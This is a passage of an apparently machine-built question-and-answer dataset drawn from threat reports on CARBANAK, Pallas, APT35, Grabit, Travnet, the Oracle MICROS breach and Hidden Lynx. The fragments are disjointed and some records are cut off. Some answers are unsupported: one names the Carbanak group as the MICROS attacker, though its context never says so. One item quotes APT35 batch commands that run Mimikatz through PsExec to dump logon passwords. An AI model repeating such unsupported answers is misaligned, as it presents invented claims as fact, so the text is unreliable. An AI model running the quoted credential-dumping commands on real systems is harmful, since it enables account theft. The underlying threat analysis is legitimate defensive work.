reimu\\AppData\\Local\\Temp\nC:\\Users\\Igor\\AppData\\Local\\Temp\nE:\\Projects\\progs\\Petrosjan\\WndRec\\...\nE:\\Projects\\progs\\sbu\\WndRec\\...\nUnfortunately, these data points don't yield many answers. If they are observed in later artifacts, connections might be inferred, but as of this writing, not much else is known about the authors.\nMedium Headline: Exploits\nI wanted to know if the CARBANAK authors wielded any exploits that were not publicly disclosed. To the contrary, I found all the exploits to be well-documented. Table 1 breaks out the escalation code I reviewed from the CARBANAK source code dump.\nThe CARBANAK source code also contains code copied wholesale from including the sekurlsa module for dumping passwords from lsass.exe and Terminal Services patching code to allow multiple remote desktop protocol connections.\nMedium Headline: Secrets\nMy analysis included an audit of passwords and key material found in the source code and accompanying binaries. Although many of these were used for debug versions, I curated them for reference in case a need might arise to guess future passwords based on passwords used in the source code. Table 2 shows recovered passwords used for RC2-\nencrypted communications and other purposes along with the corresponding name in the source code and their status as they were encountered (active in source code, commented out, or compiled into a binary).\nI found an encrypted server certificate in a debug directory. This seemed like it could provide a new network-based indicator to definitively tie operations together or catch new (<https://msdn.microsoft.com/en-us/library/ms148440.aspx>)activity. It was trivial to brute force this container by adapting a publicly available to cycle through passwords in a popular password list. The password was found in less than 1 second because it was the single-character password \"1\". The certificate turns out to be for testing, hence the weak password. The certificate is shown in Figure 3, with details in Table 3.\nHere is a pivot shared by demonstrating how this self-signed certificate is still hosted on several IPs.\nGreat findings, loving the series! Did you know the public cert in part two you found is still hosted on two servers?\n\u2014 mrdavi5 (@mrdavi51)\nFireEye has observed the certificate most recently being served on the following IPs (Table 4):\nWhile these IPs have not been observed in any CARBANAK activity, this may be an indication of a common developer or a shared toolkit used for testing various malware. Several of these IPs have been observed hosting Cobalt Strike BEACON payloads and METERPRETER listeners. Virtual Private Server (VPS) IPs may change hands frequently and additional malicious activity hosted on these IPs, even in close time proximity, may not be associated with the same users.\nI also parsed an unprotected private key from the source code dump. Figure 4 and Table 5 show the private key parameters at a glance and in detail, respectively.\nI found a value named PUBLIC_KEY defined in a configuration header, with comments indicating it was for debugging purposes. The parsed values are shown in Table 6.\nMedium Headline: Network Based Indicators\nThe source code and binaries contained multiple Network-Based Indicators (NBIs) having significant overlap with CARBANAK backdoor activity and FIN7 operations previously observed and documented by FireEye. Table 7 shows these indicators along with the associated FireEye public documentation. This includes the status of each NBI as it was encountered (active in source code, commented out, or compiled into a binary). Domain names are de-fanged to prevent accidental resolution or interaction by browsers, chat clients, etc.\nFour of these TCP endpoints (80.84.49[.]50:443, 52.11.125[.]44:443, 85.25.84[.]223, and 37.1.212[.]100:700) were new to me, although some have been .\nBig Headline: Conclusion\nOur analysis of this source code dump confirmed it was CARBANAK and turned up a few new and interesting data points. We were able to notify vendors about disclosures that specifically targeted their security suites. The previously documented NBIs, Windows API function resolution, backdoor command hash values, usage of Windows cabinet file APIs, and other artifacts associated with CARBANAK all match, and as they say, if the shoe fits, wear it. Interestingly though, the project itself isn't called CARBANAK or even Anunak as the information security community has come to call it based on the string artifacts found within the malware. The authors mainly refer to the malware as \"bot\" in the Visual Studio project, filenames, source code comments, output binaries, user interfaces, and manuals.\nThe breadth and depth of this analysis was a departure from the usual requests we receive\non the FLARE team. The journey included learning some Russian, searching through a hundred thousand of lines of code for new information, and analyzing a few dozen binaries. In the end, I'm thankful I had the opportunity to take this request.\nIn the , Tom Bennett takes the reins to provide a retrospective on his and Barry Vengerik's in light of the source code. is available as well.\nRead the text above and answer this question: How does CARBANAK use process name hashes to evade antivirus software, and what specific techniques were employed against AVG and Trend Micro?",

Pallas samples primarily rely on the permissions granted at installation in order to access sensitive user data. However, there is functionality that allows an attacker to instruct an infected device to download and install additional applications or updates. Theoretically this means it's possible for the operators behind Pallas to push specific exploit modules to compromised devices in order to gain complete access.\nWe found no attacker infrastructure containing rooting packages. This highlights that, in many cases, advanced exploitation capabilities like those shown by surveillance tools such as Pegasus for iOS and Chrysaor for Android (that targeted both 11 (<https://blog.lookout.com/trident-pegasus>) devices), are not essential, but helpful when targeting certain platforms.\n11(<https://blog.lookout.com/pegasus-android>) https://blog.lookout.com/pegasus-android\n12 (<https://blog.lookout.com/trident-pegasus>)https://blog.lookout.com/trident-pegasus\nThe Pallas first stage is capable of performing the following surveillance functionality on a compromised device:\n\u2022 Take photos with front or back camera\n\u2022 Exfiltrate all text messages including those received in the future\n\u2022 Retrieve latitude / longitude from GPS\n\u2022 Silently activate the device microphone to capture audio\n\u2022 Retrieve contacts\n\u2022 Scan nearby Wi-Fi access points and exfiltrate information about them, including their BSSID, SSID, authentication, key management, encryption schemes, signal strength, and frequency\n\u2022 Retrieve chat content from secure messaging applications (this only applies when a victim is using a secure messaging app that has been trojanized  with Pallas)\n\u2022 Retrieve device metadata\n\u2022 Retrieve text messages\n\u2022 Retrieve information about all accounts\n\u2022 Send an SMS to an attacker-specified number\n\u2022 Retrieve call logs\n\u2022 Retrieve messages and any corresponding  decryption keys from messaging apps\n\u2022 Retrieve a list of installed packages\n\u2022 Download and install additional apps\n\u2022 Upload attacker specified files\n\u2022 Delete attacker specified files and directories\n\u2022 Harvest credentials via phishing pop-ups\nSmall Headline: C2 Communications with Malware Implants\nAll samples belonging to the Pallas malware family have the same capabilities and functionality described in the previous section. However, obfuscation did differ between them. For reference, code snippets shown in the following section have been taken from a trojanized version of WhatsApp with a package name of com.gbwhatsapp and a SHA1 hash of ed4754effda466b8babf87bcba2717760f112455.\nLike most other surveillanceware, communication with the C2 includes three main phases:\n1. Regular beaconing to the remote HTTP server.\n2. Handling any outstanding attacker specified commands.\n3. Exfiltration / uploading of victim data to C2 servers.\nPallas samples have a number of different entry points via broadcast receivers, specifically the C2 communications reside in the com.receive.MySe.\nIn all Pallas samples Lookout analyzed, domain information and URL paths are hardcoded as encrypted values. The actor uses AES encryption and chose to use the secret key of Bar12345Bar12345 and initialization vector of RandomInitVector, which appears in a post describing how to use AES encryption in Java13 .\nExamples of AES encrypted, base64 encoded domains and URL paths present in some Pallas samples include:\n\u2022 krgbAdOUCGKEnuCRp5s+eE2eMWUktZQR64RBdkNoH/O0NFo9ByRTFhjqa2UX2Y9k\n\u2022 krgbAdOUCGKEnuCRp5s+eA/hX2erfMp+49exa+8zoZgMlBICjGuOSqrvGRCjgrZ4\nThese two examples decrypt to:\n\u2022 https://adobeair[.]net/wp9/add.php\n\u2022 https://adobeair[.]net/wp9/upload.php\nThe general format of Pallas requests can be written as https://adobeair[.]net/<campaign_identifier>/<add.php or upload.php>.\nThe add.php script is used for several operations, including compromised device check-ins as well as C2 instruction execution. We also determined that it is able to retrieve location information (GPS data) and general metadata about a victim's device. The following table provides additional details around the structure of these requests. In all cases, the Content-Type header is set to application/x-www-form-urlencoded. The listed ac parameter identifies the type of request made to the C2.\n13 (<https://stackoverflow.com/questions/15554296/simple-java-aes-encrypt-decrypt-example>)https://stackoverflow.com/questions/15554296/simple-java-aes-encrypt-decrypt-example\nResponses from C2 infrastructure to devices infected with Pallas consist of chunks of data separated by a \"~!\". The following  table shows the commands that are currently supported. Some of these require the victim's device to report back to the C2  and/or upload files to it via HTTP POST requests. The responses to the attacker commands detailed below are handled via the add.php page.\nPallas handles the exfiltrated data server-side via the upload.php script. This accepts HTTP POST requests that have the following headers and structure, where op_id specifies the type of file being uploaded.\nWhen Pallas receives the GALL1 instruction, it uploads exfiltrated data as a zip archive or saves it as a .db file. For most .db files, each line is base64 encoded and prepended with the string \"*#@\". When decoded, each line translates to a piece of exfiltrated data. Each piece of information is associated with a content keyword or data type. This can be represented as follows:\n<DataType><separator>[<field><separator>...<field><separator>]\nAnalysis of all known Pallas samples seen to date has resulted in the identification of the following 10 data types:\n14 (<https://developer.android.com/guide/topics/providers/content-provider-basics.html>)https://developer.android.com/guide/topics/providers/content-provider-basics.html\n15 (<https://developer.android.com/reference/android/provider/ContactsContract.CommonDataKinds.Phone.html>)https://developer.android.com/reference/android/provider/ContactsContract.CommonDataKinds.Phone.html\n16 (<https://developer.android.com/reference/android/provider/CallLog.Calls.html>)https://developer.android.com/reference/android/provider/CallLog.Calls.html\n17 (<https://docs.oracle.com/javase/7/docs/api/java/sql/Date.html>)https://docs.oracle.com/javase/7/docs/api/java/sql/Date.html\n(continued from page 28)\n18 https://developer.android.com/reference/android/net/wifi/ScanResult.html\n\nQuestion: How does the Pallas malware, associated with Dark Caracal, exploit Android devices without relying on zero-day vulnerabilities?

    "output": "Pallas samples primarily rely on the permissions granted at installation to access sensitive user data. These permissions allow the malware to perform various surveillance functions such as taking photos, exfiltrating text messages, retrieving GPS data, activating the microphone, and scanning nearby Wi-Fi access points. Additionally, Pallas has the capability to download and install additional applications or updates, theoretically allowing attackers to push specific exploit modules to compromised devices to gain complete access. This approach demonstrates that advanced exploitation capabilities, like those used by tools such as Pegasus for iOS and Chrysaor for Android, are not essential but can be helpful in certain scenarios.",

    "instruction": "Big Headline: CASE STUDY: APT35\nIn early 2017, Mandiant responded to an incident involving APT35 targeting an energy company. The attacker used a spear-phishing email containing a link to a fake resume hosted on a legitimate website that had been compromised. The resume contained the PUPYRAT backdoor, which communicated with known APT35 infrastructure. APT35 also installed BROKEYOLK, a custom backdoor, to maintain persistence on the compromised host. They then proceeded to log directly into the VPN using the credentials of the compromised user.\nOnce connected to the VPN, APT35 focused on stealing domain credentials from a Microsoft Active Directory Domain Controller to allow them to authenticate to the single-factor VPN and Office 365 instance. The attacker did not deploy additional backdoors to the environment.\nDuring the analysis of a compromised domain controller, Mandiant identified batch files (Fig. 4) that were used to steal credentials and hide attacker activity by performing the following actions:\n1. Copied a modified variant of Mimikatz to the remote system.\n2. Executed Microsoft's Sysinternal's PsExec utility to deploy and execute a Windows batch file containing commands to execute the Mimikatz variant on each target system.\n3. Copied the contents of the Mimikatz output to a local file, named after the remote system.\n4. Deleted the modified variant of Mimikatz from the remote system.\nFigure 4. Contents of recovered batch files.\nContents of \"run.bat\"\ncopy MsMpEng.exe \\\\%1\\C$\\windows\\temp\\MsMpEng.exe\nPsExec.exe \\\\%1 -s -c m.bat -accepteula move  \\\\%1\\C$\\Windows\\temp\\temp.dat %1.txt del \\\\%1\\C$\\windows\\temp\\MsMpEng.exe\nContents of \"m.bat\"\nC:\\windows\\MsMpEng.exe privilege::debug sekurlsa::logonPasswords exit > C:\\windows\\temp\\temp.dat\nWhile the credential harvesting technique was unsophisticated, it was effective. Mandiant's analysis indicated the attacker successfully harvested credentials from more than 500 systems within the environment using this technique.\nWhile having access to the organization's environment, the attacker targeted data related to entities in the Middle East. Mandiant has previously observed targeted attackers stealing email, but few threat actors have been as successful at this as APT35. Additionally, the attacker's methodology for accessing and stealing email from a victim organization adapted to accommodate cloud migration trends as companies moved to off-premises email solutions such as Office 365.\nForensic analysis revealed the attacker leveraged Microsoft Exchange Client Access cmdlets to modify permissions on target mailboxes. Exchange has several Client Access cmdlets that are used legitimately by Exchange administrators for routine tasks and maintenance.\nMandiant observed that the attacker had granted compromised accounts read access to hundreds of mailboxes with the \"Add-MailboxPermission\" cmdlet (Fig. 5).\nFollowing the assignment of mailbox permissions, the attacker authenticated to the victim organization's Outlook Web Access (OWA) portal to access targeted inboxes. By assigning these permissions to a single account, the attacker was able to read, access and steal hundreds of emails in a single view. The attacker could also blend into normal day-to-day activities of users accessing their email through the OWA portal, and did not need to install any additional malware into the environment. Ultimately, APT35 had used access to hundreds of mailboxes to read email communications and steal data related to Middle East organizations, which later became victims of destructive attacks.\nA cmdlet is a lightweight Windows PowerShell command.\nFigure 5.

This case study from Asia Pacific illustrates the continuation of a well-established trend of exposure and compromise of poorly protected and overlooked legacy systems.\nA large company in Asia was recently the latest in a long line of organizations to be compromised because Remote Desktop Protocol (RDP) is accessible from the Internet.\nAt some point during the compromise the client's antivirus software began detecting some of the attacker's password dumping tools, so the attacker added the \"C:\\temp\\\" directory, which was being used as a tool repository, to the list of directories to not be scanned by antivirus software. Configuring the antivirus software to ignore the directory \"C:\\temp\" created a registry artifact (Fig. 6) that helped identify additional systems compromised by the attacker.\nThis case illustrates the risk posed by having the RDP accessible from the Internet. Access to RDP is a common vector used by attackers to gain access to environments either directly from the Internet or by leveraging access they gain through a third-party.\nInitial compromise: Mandiant identified evidence of malicious activity dating back several years, and that the environment had been accessed by more than one attacker. Mandiant was unable to identify how the environment was first compromised due to evidence decay.\nEstablish foothold: The attacker moved laterally within the environment and installed a variety of backdoors, keyloggers and network traffic tunnelers, ranging from publicly available malware such as Gh0stRAT, Empire, and the China Chopper web shell, to some highly powerful and non-public malware.\nEscalate privileges: The attacker leveraged credentials obtained from domain controllers and keyloggers installed on the systems of high-value individuals to provide access to the environment.\nInternal reconnaissance: The attacker conducted internal reconnaissance using built-in tools and tools that the attacker placed in the environment.  Examples of the methods used for internal reconnaissance included:\n\u2022 PowerShell\n\u2022 Windows Task Scheduler\n\u2022 NBTScan\n\u2022 TCPScan\n\u2022 Non-public keyloggers\n\u2022 Non-public screen recorders\nComplete mission: The attacker targeted billing and customer information. Mandiant identified evidence suggesting gigabytes of sensitive customer information had been exfiltrated from the network.\nFigure 6: Example of the registry artifact that was created by the attacker adding an exclusion for the directory \"C:\\temp\".\nRedacted Eventlog Messages of Whitelisting a Folder\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Popular AV Program\\AV\\Exclusions\\HeuristicScanning\\Directory\\Client\\3212312312\\ DirectoryName | C:\\temp\\\nMedium Headline: ONCE A TARGET, Always a Target\nA significant attack is attacker activity that may include data theft, compromised accounts, credential harvesting, lateral movement and spear phishing, which affects at least 43% of our managed detection and response customers.\nIn 2013 M-Trends, we looked at organizations that had been targeted or re-compromised after remediating a previous attack. Our original data showed 38 percent of clients were attacked after remediation. Our 2017 data shows that, 56 percent of FireEye managed detection and response customers who were previously Mandiant incident response clients were targets of at least one significant attack in the past 19 months by the same or similarly motivated attack group.\nWe also found that: 49%\nof customers with at least one significant attack were successfully attacked again within one year.\nVery Small Headline: Regional Considerations\nWe find that customers in the APAC region are twice as likely to have experienced multiple incidents from multiple attackers, compared to customers in EMEA or North America. Over 91 percent of our APAC customers with at least one significant attack will have attacker activity within the next year (Fig. 7). Of those customers, 82 percent will have multiple attackers identified over the life of their service (Fig. 8).\nFigure 7. Customers with one significant attack that experienced another attack of consequence, by region.\nVery Small Headline: Industry Trends\nThe top three industries most frequently targeted by multiple attackers are high-tech, telecommunications and education (Fig. 9).\nThe top three industries with the most significant attacks are financial, high-tech and healthcare (Fig. 10).\nThere is a difference between industries that have been successfully attacked by multiple threat groups versus industries that are targeted most often. Notably, the high-tech industry is both frequently targeted by multiple attackers and also sees a large number of significant attack attempts (Fig. 11).\nThis trend highlights the industries that most often have to deal with multiple types of threat actors, each with potentially different missions and TTPs to defend against.\n\u2022 Several industries appear more adaptive and more rigorous in their security posture over time. As an example, when we examine the industries that suffer multiple successful attacks, separated by remediation attempts, we observed that the financial industry was ninth out of 16 industries. Our experiences suggest the financial services are less likely to succumb to subsequent attacks over time.\n\u2022 Industries that have historically been targeted by Chinese based groups move to the top of the \"attacked by multiple groups\" list.\nUnfortunately, if you've been breached, our statistics show that you are much more likely to be attacked and suffer another breach. If you have not taken steps to enhance your security posture, you are taking a significant risk.\nQuestion: How did APT35 leverage Microsoft Exchange Client Access cmdlets to facilitate their data exfiltration efforts?",
    "output": "Answer: APT35 utilized Microsoft Exchange Client Access cmdlets to modify permissions on target mailboxes. Specifically, they used the 'Add-MailboxPermission' cmdlet to grant compromised accounts read access to hundreds of mailboxes. This allowed the attacker to read, access, and steal emails from multiple mailboxes without needing to install additional malware, blending into normal user activities.",

    "instruction": "Big Headline: Malware compilation timeline\nThe smallest sample (0.52Mb) and the largest (1.57Mb) were both created on the same day, which could indicate experiments made by the group to test features, packers and \"dead code\" implementations.\nLooking at the chart, it is interesting to see the modus operandi as the threat actor consistently strives to achieve a variety of samples, different code sizes and supposedly more complicated obfuscation.\nAlong with these different sizes, activities and obfuscation, a serious encryption algorithm was also implemented in each one of them. The proprietary obfuscated string, methods and classes made it rather challenging to analyze. ASLR is also enabled, which might point to an open source RAT or even a commercial framework that packed the malicious software in a well written structure. This type of work is known as a mitigation factor for threat actors to keep their code hidden from analysts' eyes.\nDuring our research, dynamic analysis showed that the malicious software's \"call home\" functionality communicates over obvious channels and does not go the extra mile to hide its activity. In addition, the files themselves were not programmed to make any kind of registry maneuvers that would hide them from Windows Explorer. Taking that into an equation, it seems that the threat actors are sending a \"weak knight in a heavy armor\" to war. It means that whoever programmed the malware did not write all the code from scratch. A well trained knight would never go to war with a blazing shield and yet a stick for a sword.\nLooking into the \"call home\" traffic, the Keylogger functionality prepares files that act as a container for keyboard interrupts, collecting hostnames, application names, usernames and passwords. However, the interesting part lies here.\nThe file names contain a very informative string:\nHawkEye_Keylogger_Execution_Confirmed_<VICTIM> 3.10.2015 6:08:31 PM\nHawkEye is a commercial tool that has been in development for a few years now; it appeared in 2014, as a website called (<http://hawkeyeproducts.com/>)HawkEyeProducts, and made a very famous contribution to the hacker community.\nIn the website, the product shows great versatility as it contains many types of RATs, features and functionality, such as the traditional HawkEye Logger or other types of remote administration tools like Cyborg Logger, CyberGate, DarkComet, NanoCore and more. It seems to support three types of delivery: FTP, SMTP and Web-Panel.\nAs seen, the malware uses a number of RATs to control its victims or track their activity. One of the threat actor's successful implementations contained the well-known (<https://threatpost.com/darkcomet-rat-used-new-attack-syrian-activists-081612/76919>)DarkComet. This convenient \"choose your\nRAT\" functionality plays a very important role in the malware infection, routine and survival on the victim's machine. The DarkComet samples are more complicated than the traditional HawkEye logger. One instance had a random key generator which sets an initialization vector of the first 4 bytes of the executable file and appends a random 5 byte key that unpacks another PE file, less than 20Kb in size. The PE file then contains another packer with an even more challenging obfuscation technique. The last sample we tested had still more complicated behavior. The code itself had the same obfuscation technique, though traffic was not transferring in clear text. Stolen data was packed and sent encrypted over HTTP random ports. This means that the group is trying to produce other types of malicious samples with different RATs.\nApproximately 10,000 stolen files have been collected. Companies based in Thailand and India had the largest percentage of infected machines. By looking at the stolen credentials, it is very clear that employees sent the malware to one another, as stolen host names and internal applications are the same.\nThe following is the full chart, updated to May 2015:\nBig Headline: Malware distribution by country\nDemonstrating the effectiveness of their simple Keyloggers, one C2 (on May 15th) maintained thousands of victim account credentials from hundreds of infected systems.\nTo sum it up, Grabit threat actors did not use any sophisticated evasions or maneuvers in their dynamic activity. It is interesting to see the major differences between the core development of the malware and the actual functionality it uses.\nSome malware samples used the same hosting server, and even the same credentials. Could it be that our\nthreat actor was in a hurry? Our guess is that we are looking at a group and not an individual. Some members of the group are more technical than the others and some are more security oriented and aware of the risks they might expose themselves to.\nBig Headline: Back to square one:\nFrom what we have seen so far, the malware is being delivered as a Microsoft Office Word (.doc) email attachment, containing a malicious macro called AutoOpen. This macro simply opens a socket over TCP and sends an HTTP request to a remote server that was hacked by the group to serve as a malware hub, before downloading the malware. In some cases the malicious macro was password protected, but our threat actor might have forgotten that a .doc file is actually an archive and when that archive is opened in a convenient editor of your choice, the macro strings are shown in clear-text.\nThe malware is in plain view, modifying commonplace registry entries, such as the startup configurations, and not covering its tracks. Its binaries are not deleted in most cases, and its communication is in clear-text, where the victim can sniff the communication and grab the FTP/SMTP server's credentials.\nMalware derivatives are mainly located in:\nC:\\Users\\ <user> \\AppData\\Roaming\\Microsoft\n\nWhy did the threat actors behind Grabit create samples of varying sizes and complexity, and what does this indicate about their modus operandi?",
    "output": "A: The threat actors behind Grabit created samples of varying sizes and complexity to test different features, packers, and 'dead code' implementations.

The major changes are as follows:\n\uf0b7 It's an executable & not a DLL.\n\uf0b7 The compression algorithm has been modified.\n\uf0b7 It tries to install itself on the victim machine to achieve persistence instead of dropping other payloads.\n\uf0b7 Supports just 2 instructions from the C&C instead of 4, like in the previous version.\nApart from these, there isn't much difference. The following analysis only focuses on what has changed.\nIt achieves persistence by copying itself to the currently logged-in user's \"temp\" folder as \"csmss.exe\" & placing a shortcut to it, named as \"seruvice.lnk\" in the \"startup\" folder.\nThe next step it to create a new mutex object to avoid running multiple instances. It names the mutex as \"Assassin\".\nAfter this, it generates a unique 8 characters long \"hostid\", based on volume serial number to identify the bot. This is common to the previous variant too.\nThen it checks if the victim machine is connected to the internet or not, by trying to resolve \"smtp.live.com\" & if that fails, as a second attempt, \"smtp..yahoo.com\".\nThe strings displayed above, are actually in \"Chinese\" & turn out to be :\n\uf0b7 \"You can connect to the network.\"\n\uf0b7 \"Unable to connect to the network.\"\nUnlike the previous variant, this one doesn't seem to collect sensitive information about the victim machine. It just makes a list of all files & folders on the victim machine & dumps it into a file named as\n\"AllIndex.ini\". Next step is to compress the contents of this file, copy the compressed content to a new file named as \"AllIndex.ini_d\" & then delete the previously created clear-text file. The contents of both the files are as follows:\nFilename : AllIndex.ini\nFilename : AllIndex.ini_d\nIt's pretty obvious that the compression ratio achieved by the custom algorithm is quite high from the following image:\nApart from that, this variant also creates a file that lists all the currently running processes on the victim machine, into a text file named \"Process.dll\" inside the currently logged-on user's \"temp\" folder. This variant also uses a modified naming convention to upload files onto the remote C&C. The only other major difference from the previous variant is the fact that this one only supports 2 commands from the remote C&C server, instead of 4 & they are as follows:\n\uf0b7 Uninstall\n\uf0b7 Upload\nThe C&C server in case of this variant was located at :\nSmall Headline: Travnet Technical Analysis : Part C\nApart from analyzing the malware samples, we also tried to gather as much information about the C&C servers as we could. The fact that even after a lot of research papers being published on the analysis of the Travnet malware, some of the C&C servers are still active & functioning, is noteworthy. We were able to locate a few of them. The ones that caught our attention are currently hosted on these domains :\n\uf0b7 www.pkspring.net\n\uf0b7\nLet's start with the analysis of \"\". WHOIS record for the domain currently is as follows:\nRegistrant information for the domain is as follows :\nOur analysis strongly suggests that the group behind Travnet might be from China. The above record is just one of the findings that supports the claim. Its interesting to note that the domain was recently registered, is locked & expires in 2014. Another interesting observation is the address of the registrant. \"Guangdong\" province from China seems to pop up everywhere. Its also noteworthy that the domain is still active & still hosting the Travnet C&C. We've also observed that the C&C now remains active only during specific time of the day. The time-stamp from the images below, confirms this.\nActive response from the C&C :\nC&C server refusing connection later on the same day :\nIts obvious that even after the discovery of the malware, the group behind this specific attack is determined to keep it alive. The Travnet malware as well as its C&C infrastructure is constantly evolving. Lets move onto the next active domain.\nThe Travnet C&C hosted at \"pkspring.net\" seems to be fully functional & active all the time. The response from the server when opened from a browser is as follows:\nAnother interesting finding is the fact that it hosts Travnet C&C on 3 different ports on the server. They are as follows:\n\uf0b7 80\n\uf0b7 443\n\uf0b7 8080\nIts evident from the following pictures.\nPort 443\nPort 8080\nMoving on, we found out that 21 domains are hosted on the same server at the moment. And all of them are active C&C servers for the Travnet malware. They also seem to have interesting domain names. Its an indication of the seriousness of the campaign.\nOther domains hosted & owned by the same group on the same server/IP :\nThe image below proves that all of the above domains serve the same Travnet C&C on the same 3 ports, each.\nAfter this, we focused our attention on the WHOIS details of these domains. At the moment, the details of the registrant is kept private & it was recently updated. Its also interesting to note that the group behind this has ensured that the domain cannot be taken over by someone else. The following page contains the current WHOIS data for the domain.\n\"Pkspring.net\" WHOIS data (Recent)\nRegistrant details for the domain :\nNothing much to go on there at the moment. But thanks to older WHOIS records, we found out some interesting facts.\nThe same domain was earlier registered as follows:\nIt was apparently created on 20-march-2009 & its expiration date was set to 20-march-2013. The registrant's information at that time was as follows:\nThe above data seems familiar. The only difference now being that the domains have be renewed, registration details kept private & the email ID of the registrant has changed from \"\" to \"\", which belongs to a private Chinese mail service () . The same thing\nhas happened with other publicly disclosed Travnet C&C domains. We also fetched details of another domain that previously hosted Travnet C&C & has been recently renewed, most likely by the same group.\nA search for the email \"\" led us to the following page :\nThe above listed domains are already known to have hosted the Travnet C&C. We did some research on the current status of one of the domains from the above list, \"discoverypeace.org\". The current WHOIS data for the domain \"discoverypeace.org\" is as follows:\nThis looks strikingly similar to the current status of the active C&C domain \"pkstring.net\". It was also recently updated. The older WHOIS entry for the same domain was as follows :\nSmall Headline: Conclusion of Travnet Analysis:\nFrom our analysis of the Travnet malware so far, it's quite evident that many things hint at the origin of this campaign to be from China. It's also a known fact the Indian government & other important sectors from India were heavily targeted during this campaign. T\nThe fact that this was a highly targeted attack & focused on stealing confidential documents & sensitive information makes it noteworthy.\nSmall Headline: Use of Outdated Software on Government Websites\nAnother interesting finding is the fact that many of the servers that host \"gov.in\" sites are running outdated software versions.\nAs an example, from the above image, it is evident that the domain \"karnataka.gov.in\" is hosted on a server running \"Windows Server 2003\", on 22-June-2013. To confirm this, we ran an nmap scan & it's not surprising to find out that the information is true. The screenshot of our nmap scan is as follows:\nWhile use of outdated software is one of the major concerns, it seems most of the Indian government sites are riddled with vulnerable code too. It's quite common to locate webshells on these sites.\nSmall Headline: Webshells on Indian Websites\nOne of the many live webshells we found recently during our analysis is shown in the following image:\nFrom the time-stamps on the above image, it's evident that this is webshell is still active at the time of this this writing. An example of a government site that's not properly managed & discloses highly sensitive information is as follows:\nThe above screenshot is just one of the many live examples of poorly managed web servers that do not follow even the most basic web application security guidelines. Even important government sites, access to which can lead to much deeper intrusion seem to be managed with little care. The following image is just one of the examples of developing or customizing a CMS & not properly handling access-control.\nWhile defacements are usually carried out by hackers just for fun or fame, in a way its a boon in disguise. Serious hackers can cause much more damage & remain unnoticed for a very long time by having access to the privileges these hackers abuse to deface the site. Slowly but steadily, serious APT campaigns are on the rise. Its very important for the nation to start upgrading its IT infrastructure & keep up with the latest security guidelines & practices. The next part of this research paper focuses on a recent APT campaign against multiple countries including India was targeted.\nWhile each and every technical cause for weak Indian Cyber space is beyond the scope of this document, we also believe that India requires a strong policy driven approach along with inspiring leadership from thought leaders and Government departments in Information security to bring the much needed change.\n\nWhat are the two commands supported by the updated variant of Travnet from the remote C&C server, and how does this differ from the previous version?",
    "output": "The updated variant of Travnet supports only two commands from the remote C&C server: 'Uninstall' and 'Upload'. This differs from the previous version, which supported four commands.",

Visa also published a list of Internet addresses that may have been involved in the Oracle breach and are thought to be closely tied to an Eastern European organized cybercrime gang.\nThe Visa alert is the first substantive document that tries to help explain what malware and which malefactors might have hit Oracle \u2014 and by extension many of Oracle's customers \u2014 since KrebsOnSecurity . That story cited sources close to the investigation saying hackers had broken into hundreds of servers at Oracle's retail division, and had completely compromised Oracle's for MICROS customers.\nMICROS is among the top three point-of-sale vendors globally. Oracle's MICROS division sells point-of-sale systems used at more than 330,000 cash registers worldwide. When Oracle bought MICROS in 2014, the company said MICROS's systems were deployed at some 200,000+ food and beverage outlets, 100,000+ retail sites, and more than 30,000 hotels.\nIn short, tens of millions of credit cards are swiped at MICROS terminals monthly, and a breach involving the theft of credentials that might have granted remote access to even just a small percentage of those systems is potentially a big and costly problem for all involved.\nSo far, however, most MICROS customers are left scratching their heads for answers. A (PDF) Oracle also released last Monday held little useful information. Oracle issued the same to everyone who asked for particulars about how far the breach extended. \"Oracle has detected and addressed malicious code in certain legacy MICROS systems.\"\nOracle also urged MICROS customers to change their passwords, and said \"we also recommend that you change the password for any account that was used by a MICROS representative to access your on-premises systems.\"\nOne of two documents Oracle sent to MICROS customers and the sum total of information the company has released so far about the breach.\nSome technology and fraud experts, including Gartner Analyst Avivah Litan, read that statement highlighted in yellow above as an acknowledgement by Oracle that hackers may have abused credentials gained in the MICROS portal breach to plant malicious code on the point-of-sale devices run by an unknown number of MICROS customers.\n\"This [incident] could explain a lot about the source of some of these retail and merchant point-of-sale hacks that nobody has been able to definitively tie to any one point-of-sale services provider,\" Litan told me last week. \"I'd say there's a big chance that the hackers in this case found a way to get remote access\" to MICROS customers' on-premises point-of-sale devices.\"\nClearly, Visa is concerned about this possibility as well.\n\nAnswer this question based on the above context: How did the Carbanak group leverage the Oracle MICROS breach to potentially compromise point-of-sale systems, and what specific actions did Visa recommend to mitigate the risk?",
    "output": "The Carbanak group exploited the Oracle MICROS breach by potentially using stolen credentials to gain remote access to the point-of-sale devices of MICROS customers.

    "instruction": "Context: Medium Headline: What are they capable of?\nThe group's tools, tactics and procedures are innovative and typically cutting-edge. They use custom tools and techniques that they tailor to meet their objectives and maximize their chance of success. They attack public-facing infrastructure and have been observed installing highly customized Trojans that are purpose-built for stealth. They engineered one of the most successful watering-hole attacks to-date. They also undertake spear-phishing attacks and hack supply chains in order to distribute their custom Trojans. This is an established team with years of experience. They are well resourced and highly skilled.\nThe Hidden Lynx group's advanced capabilities are clearly demonstrated in three major campaigns. In the VOHO campaign, they showed how they could subvert Bit9's established trust models. In the FINSHO campaign, they managed to get advanced knowledge of a zero-day exploit and in the SCADEF operation, they undertook supply chain attacks to succeed in their campaign.\nVery Small Headline: The Bit9 incident\nBit9 is a security company headquartered in Waltham, Massachusetts. As an alternative to traditional signature-based antivirus solutions, Bit9 offers a trust-based security platform that runs off of a cloud-based reputation service combined with policy-driven application control and whitelisting to protect against cyberthreats. As a result, it is difficult for a malicious third-party to install an untrusted application, such as a remote access Trojan (RAT), onto a system that is adequately protected with the Bit9 platform. Undaunted by this, the elite Hidden Lynx group took up the challenge.\nOn February 8 2013, Bit9 released details revealing that a malicious third-party had gained access to one of their digital code-signing certificates. During this incident, a number of Trojans and malicious scripts were signed. In a follow up post on February 25, more details of the attack emerged. In July 2012, more than six months earlier, a malicious third-party gained access to their network using an SQL injection attack. Due to an operational oversight, a public-facing server that wasn't protected with the Bit9 platform allowed the attackers to gain unauthorized access.\nThe attackers installed Backdoor.Hikit, a Trojan that provides extremely stealthy remote access to compromised systems. This highly customized Trojan is typically installed onto servers in the victims' DMZ, which was the case at Bit9. Credentials for another virtual machine were then stolen. These were used to access the virtual machine that contained one of Bit9's digital code-signing certificates. The attackers used this code-signing infrastructure to sign thirty-two malicious files. Symantec telemetry shows some of these files have been present within select organizations in the United States defense industrial sector.\nThe signing of these files is significant, since they could then be used to circumvent the trust protection model offered by the Bit9 platform. The 